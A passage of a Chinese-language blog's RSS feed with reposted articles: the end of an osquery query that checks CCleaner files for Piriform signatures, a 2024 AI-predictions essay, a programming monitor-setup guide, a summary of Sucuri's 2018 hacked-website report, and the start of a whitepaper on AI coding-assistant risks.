&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;authenticode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;subject_name&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;AS&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;subject_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;authenticode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;serial_number&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;AS&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;serial_number&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;authenticode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;AS&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;status&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hashes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sha256&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;AS&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sha256&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;WHERE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;directory&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;C:\Program Files\CCleaner&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;AS&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;files&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;LEFT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;JOIN&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;authenticode&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;ON&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;authenticode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;files&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;LEFT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;JOIN&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hash&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;AS&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hashes&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;ON&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hashes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;files&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;WHERE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;authenticode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;subject_name&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;LIKE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;%Piriform%&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;AND&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;authenticode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;serial_number&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;52b6a81474e8048920f1909e454d7fc0&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;未来展望&#34;&gt;未来展望
&lt;/h2&gt;&lt;p&gt;本文展示了osquery作为系统信息检索工具的灵活性：通过熟悉的SQL语法，可快速定制查询以获取目标信息。Authenticode签名检查仅是osquery作为事件响应工具的用途之一。许多IT和安全团队正利用osquery进行实时响应，包括初始恶意软件检测和传播分析。&lt;/p&gt;
&lt;p&gt;Trail of Bits很早就认识到osquery的潜力。过去一年中，我们根据客户需求持续添加功能。如果您正在使用或考虑使用osquery，并需要特定功能，请联系我们！我们愿助您定制osquery以满足需求。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>2024年AI预测与思考：技术趋势与安全隐忧</title>
        <link>http://localhost:1313/p/2024%E5%B9%B4ai%E9%A2%84%E6%B5%8B%E4%B8%8E%E6%80%9D%E8%80%83%E6%8A%80%E6%9C%AF%E8%B6%8B%E5%8A%BF%E4%B8%8E%E5%AE%89%E5%85%A8%E9%9A%90%E5%BF%A7/</link>
        <pubDate>Sun, 03 Aug 2025 06:42:58 +0800</pubDate>
        
        <guid>http://localhost:1313/p/2024%E5%B9%B4ai%E9%A2%84%E6%B5%8B%E4%B8%8E%E6%80%9D%E8%80%83%E6%8A%80%E6%9C%AF%E8%B6%8B%E5%8A%BF%E4%B8%8E%E5%AE%89%E5%85%A8%E9%9A%90%E5%BF%A7/</guid>
        <description>&lt;h2 id=&#34;企业全员开发化时代来临&#34;&gt;企业全员开发化时代来临
&lt;/h2&gt;&lt;p&gt;ChatGPT带来的问题将愈演愈烈。任何员工都能轻松复制Python代码调用API，而GPTs、微软Copilot Studio等工具的涌现将进一步降低技术门槛。这些工具的核心价值在于让非技术人员通过自然语言编程并部署应用，但随之而来的是严重的安全隐患：缺乏开发经验的员工可能无意中暴露数据、违反合规要求，而安全团队甚至无从知晓这些&amp;quot;影子应用&amp;quot;的存在。传统开发安全流程已无法应对这种分布式开发浪潮。&lt;/p&gt;
&lt;h2 id=&#34;生成式ai落地困境持续&#34;&gt;生成式AI落地困境持续
&lt;/h2&gt;&lt;p&gt;O&amp;rsquo;Reilly最新报告显示，企业采用生成式AI的最大障碍是缺乏合适的商业场景。即使找到应用场景，从测试到生产环境的过程充满变数——小规模测试成功的技术，往往在真实复杂环境中暴露出致命缺陷。全球顶尖企业尚且难以实现技术落地，这个趋势将在2024年持续。&lt;/p&gt;
&lt;h2 id=&#34;深度ai集成的安全隐私危机&#34;&gt;深度AI集成的安全隐私危机
&lt;/h2&gt;&lt;p&gt;当AI深度嵌入系统时，我们将进入文件访问无记录、数据传输无预警、代码变更无痕迹的&amp;quot;安全黑洞&amp;quot;。这些实验性技术尚未完全暴露所有缺陷，却已被快速部署到核心系统。攻击面因此扩大：原本稳健的应用程序可能被新型攻击手段操控。隐私方面，大语言模型(LLM)需要明文交互进行质量评估的特性，使得敏感数据暴露风险剧增。不同产品线的隐私保护差异更需警惕。&lt;/p&gt;
&lt;h2 id=&#34;gpt-5技术突破有限&#34;&gt;GPT-5技术突破有限
&lt;/h2&gt;&lt;p&gt;尽管舆论热炒GPT-5将接近通用人工智能(AGI)，但现实可能令人失望。当前LLM技术已触及天花板，仅靠规模扩大收效甚微。各厂商发布的模型在本质上差异不大，某些任务表现提升也仅限于特定领域。除非出现革命性创新，否则2024年我们仍将处于技术平台期。&lt;/p&gt;
&lt;h2 id=&#34;ai环境成本浮出水面&#34;&gt;AI环境成本浮出水面
&lt;/h2&gt;&lt;p&gt;生成式AI的&amp;quot;肮脏小秘密&amp;quot;是其惊人的环境代价：每处理50次查询就消耗500毫升水（相当于1瓶矿泉水）。最新研究《Power Hungry Processing》揭示：生成任务比判别任务耗能更高，图像处理比文本处理碳足迹更大，训练过程比推理过程能耗高出数量级。当科技巨头停止补贴，真实运营成本将颠覆当前商业模式。&lt;/p&gt;
&lt;h2 id=&#34;回归技术实用主义&#34;&gt;回归技术实用主义
&lt;/h2&gt;&lt;p&gt;技术不需要改变世界才能创造价值。就像驾驶辅助系统虽未实现完全自动驾驶，却已显著提升行车安全。2024年将是AI去泡沫化的开始——投资者将提出更尖锐的问题，企业会更务实评估技术投入。但真正的创新永远值得期待，关键在于建立审慎的技术评估和部署机制。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>编程理想显示器配置方案（已解决！）</title>
        <link>http://localhost:1313/p/%E7%BC%96%E7%A8%8B%E7%90%86%E6%83%B3%E6%98%BE%E7%A4%BA%E5%99%A8%E9%85%8D%E7%BD%AE%E6%96%B9%E6%A1%88%E5%B7%B2%E8%A7%A3%E5%86%B3/</link>
        <pubDate>Sun, 03 Aug 2025 06:31:56 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E7%BC%96%E7%A8%8B%E7%90%86%E6%83%B3%E6%98%BE%E7%A4%BA%E5%99%A8%E9%85%8D%E7%BD%AE%E6%96%B9%E6%A1%88%E5%B7%B2%E8%A7%A3%E5%86%B3/</guid>
        <description>&lt;h1 id=&#34;编程理想显示器配置方案已解决&#34;&gt;编程理想显示器配置方案（已解决！）
&lt;/h1&gt;&lt;p&gt;最优屏幕配置的承诺在于：如果能同时显示编程项目的所有相关部分，就能节省切换工作区域所需的时间和脑力——从而成为效率更高的程序员。但：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果屏幕过大导致查看边缘区域时需要扭动脖子——这是负面影响&lt;/li&gt;
&lt;li&gt;使用曲面超宽屏获取更多空间——也可能带来弊端&lt;/li&gt;
&lt;li&gt;拼接过多独立显示器——光标移动会变得麻烦&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;黄金配置方案&#34;&gt;黄金配置方案
&lt;/h2&gt;&lt;p&gt;推荐采用&amp;quot;1+2&amp;quot;三屏布局：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;中央主屏：27英寸2560×1440分辨率（1440p/QHD/2K），位于视觉焦点中心&lt;/li&gt;
&lt;li&gt;两侧辅屏：各配一台27英寸LG DualUp竖屏（16:18比例），稍向内倾斜&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;1440p-vs-4k分辨率&#34;&gt;1440p vs 4K分辨率
&lt;/h2&gt;&lt;p&gt;在臂长距离下，1440p无需缩放即可清晰显示所有内容。4K屏幕虽然显示效果更优，但存在软件兼容性问题。1440p在27英寸屏上提供恰到好处的空间，且无需担心缩放不一致。&lt;/p&gt;
&lt;h2 id=&#34;竖屏显示器的局限&#34;&gt;竖屏显示器的局限
&lt;/h2&gt;&lt;p&gt;竖屏配置能增加纵向空间，但水平空间有限。适合放置代码编辑器或文档，但不适合宽幅应用窗口或并排窗口。&lt;/p&gt;
&lt;h2 id=&#34;单块大屏的弊端&#34;&gt;单块大屏的弊端
&lt;/h2&gt;&lt;p&gt;虽然30英寸以上的超宽屏（如3440×1440分辨率）能提供高PPI和广阔水平空间，但存在以下问题：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;窗口管理困难，需要依赖分屏软件&lt;/li&gt;
&lt;li&gt;应用全屏时会占满整个视野&lt;/li&gt;
&lt;li&gt;笔记本外接时断开连接会导致窗口位置丢失&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;曲面屏的争议点&#34;&gt;曲面屏的争议点
&lt;/h2&gt;&lt;p&gt;优点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;沉浸式体验&lt;/li&gt;
&lt;li&gt;减少头部转动&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;缺点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;边缘窗口显示不自然&lt;/li&gt;
&lt;li&gt;反光问题严重&lt;/li&gt;
&lt;li&gt;可能引发眩晕感&lt;/li&gt;
&lt;li&gt;搬运风险高&lt;/li&gt;
&lt;li&gt;价格昂贵&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;双屏配置方案&#34;&gt;双屏配置方案
&lt;/h2&gt;&lt;p&gt;替代方案可采用：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;一大一小双屏（精简版黄金配置）&lt;/li&gt;
&lt;li&gt;两块相同大屏（需更多头部转动）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;配置建议：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;避免将双屏接缝置于正前方&lt;/li&gt;
&lt;li&gt;主屏居中放置IDE&lt;/li&gt;
&lt;li&gt;副屏用于文档/调试器/程序输出&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;笔记本外接方案&#34;&gt;笔记本外接方案
&lt;/h2&gt;&lt;p&gt;预算有限时可选择：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;24英寸外接屏+笔记本屏幕&lt;/li&gt;
&lt;li&gt;需将笔记本抬高至视线水平&lt;/li&gt;
&lt;li&gt;建议使用外接键盘&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;显示器型号推荐&#34;&gt;显示器型号推荐
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;主屏首选&lt;/strong&gt;：Dell Ultrasharp 27英寸&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;2560×1440 LED面板&lt;/li&gt;
&lt;li&gt;坚固耐用结构&lt;/li&gt;
&lt;li&gt;多功能支架&lt;/li&gt;
&lt;li&gt;性价比高&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;辅屏旗舰&lt;/strong&gt;：LG DualUp&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;16:18特殊比例（2560×2880）&lt;/li&gt;
&lt;li&gt;支持横竖切换&lt;/li&gt;
&lt;li&gt;额外空间适合放置通讯类窗口&lt;/li&gt;
&lt;li&gt;竖屏模式可显示更多代码行&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>深度解析SUCURI《2018被黑网站趋势报告》：CMS漏洞与恶意软件攻防实录</title>
        <link>http://localhost:1313/p/%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90sucuri2018%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E8%B6%8B%E5%8A%BF%E6%8A%A5%E5%91%8Acms%E6%BC%8F%E6%B4%9E%E4%B8%8E%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E6%94%BB%E9%98%B2%E5%AE%9E%E5%BD%95/</link>
        <pubDate>Sun, 03 Aug 2025 06:20:59 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90sucuri2018%E8%A2%AB%E9%BB%91%E7%BD%91%E7%AB%99%E8%B6%8B%E5%8A%BF%E6%8A%A5%E5%91%8Acms%E6%BC%8F%E6%B4%9E%E4%B8%8E%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E6%94%BB%E9%98%B2%E5%AE%9E%E5%BD%95/</guid>
        <description>&lt;h3 id=&#34;cms安全态势分析&#34;&gt;CMS安全态势分析
&lt;/h3&gt;&lt;p&gt;报告显示56%被黑网站的核心CMS平台已安装最新补丁。但深入分析各CMS版本状态后发现问题依然严峻：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;WordPress&lt;/strong&gt;：虽然36.7%的受感染站点存在版本滞后（较2016年下降24.3%），但其仍占被黑网站的60%，反映出第三方生态的安全隐患&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;电商平台&lt;/strong&gt;：Magento(83.1%)、OpenCart(91.3%)和PrestaShop(97.2%)的版本滞后率惊人，这些处理支付交易的系统存在核心漏洞风险，且升级过程存在兼容性难题&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;主要攻击向量&#34;&gt;主要攻击向量
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;凭证填充攻击&lt;/strong&gt;：通过暴力破解获取管理员权限&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;第三方组件漏洞&lt;/strong&gt;：2018年发现196个漏洞，其中：
&lt;ul&gt;
&lt;li&gt;WordPress插件116个漏洞（17%为高危）&lt;/li&gt;
&lt;li&gt;Joomla!扩展28个高危漏洞&lt;/li&gt;
&lt;li&gt;Magento第三方模块正成为新兴攻击入口&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;黑名单机制缺陷&#34;&gt;黑名单机制缺陷
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;仅11%的被黑网站触发黑名单（同比下降6%）&lt;/li&gt;
&lt;li&gt;各平台检测率差异显著：
&lt;ul&gt;
&lt;li&gt;Norton：46.1%&lt;/li&gt;
&lt;li&gt;Google：10.4%&lt;/li&gt;
&lt;li&gt;McAfee：下降4%&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;恶意软件家族分布&#34;&gt;恶意软件家族分布
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;后门程序&lt;/strong&gt;：68%的感染站点存在（主要用于维持持久访问）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;SEO垃圾注入&lt;/strong&gt;：同比增长78%，主要篡改：
&lt;ul&gt;
&lt;li&gt;index.php（34.5%）：隐藏文件包含攻击&lt;/li&gt;
&lt;li&gt;functions.php（13.5%）：SEO垃圾注入器&lt;/li&gt;
&lt;li&gt;wp-config.php（10.6%）：数据库凭证窃取&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;加密货币挖矿&lt;/strong&gt;：33%为服务端PHP矿工，67%为客户端JS矿工（如CoinHive）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;关键防御建议&#34;&gt;关键防御建议
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;建立多黑名单平台监控（Google/Norton/Yandex等）&lt;/li&gt;
&lt;li&gt;对核心文件（如wp-config.php）实施完整性校验&lt;/li&gt;
&lt;li&gt;采用深度扫描清除隐藏后门&lt;/li&gt;
&lt;li&gt;电商站点需严格遵守PCI DSS 6.2条款（关键补丁30天内部署）&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;报告完整数据见&lt;a class=&#34;link&#34; href=&#34;https://sucuri.net/reports/2018-hacked-website-report&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;SUCURI 2018被黑网站报告&lt;/a&gt;，技术团队另提供&lt;a class=&#34;link&#34; href=&#34;https://blog.sucuri.net/2019/03/how-to-clean-a-hacked-wordpress-website.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;恶意文件清理指南&lt;/a&gt;。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>AI编程助手风险分析与应对策略</title>
        <link>http://localhost:1313/p/ai%E7%BC%96%E7%A8%8B%E5%8A%A9%E6%89%8B%E9%A3%8E%E9%99%A9%E5%88%86%E6%9E%90%E4%B8%8E%E5%BA%94%E5%AF%B9%E7%AD%96%E7%95%A5/</link>
        <pubDate>Sun, 03 Aug 2025 06:10:03 +0800</pubDate>
        
        <guid>http://localhost:1313/p/ai%E7%BC%96%E7%A8%8B%E5%8A%A9%E6%89%8B%E9%A3%8E%E9%99%A9%E5%88%86%E6%9E%90%E4%B8%8E%E5%BA%94%E5%AF%B9%E7%AD%96%E7%95%A5/</guid>
        <description>&lt;p&gt;随着ChatGPT等大型语言模型（LLM）的兴起，开发者正将这些工具实际应用于代码编写和理解场景。编程语言虽然结构严谨，但AI辅助编码仍存在多重风险，这正是我们撰写本技术白皮书的核心动因。&lt;/p&gt;
&lt;h3 id=&#34;主要使用场景&#34;&gt;主要使用场景
&lt;/h3&gt;&lt;p&gt;开发者主要通过三种方式使用这些工具：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;代码补全&lt;/strong&gt;：自动完成函数或代码行&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;代码解释&lt;/strong&gt;：解析现有代码逻辑&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;文档生成&lt;/strong&gt;：自动创建技术文档&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;其中代码补全功能的风险最为显著，工具可能直接输出包含漏洞的代码片段。&lt;/p&gt;
&lt;h3 id=&#34;核心风险分析&#34;&gt;核心风险分析
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;安全输出无保障&lt;/strong&gt;&lt;br&gt;
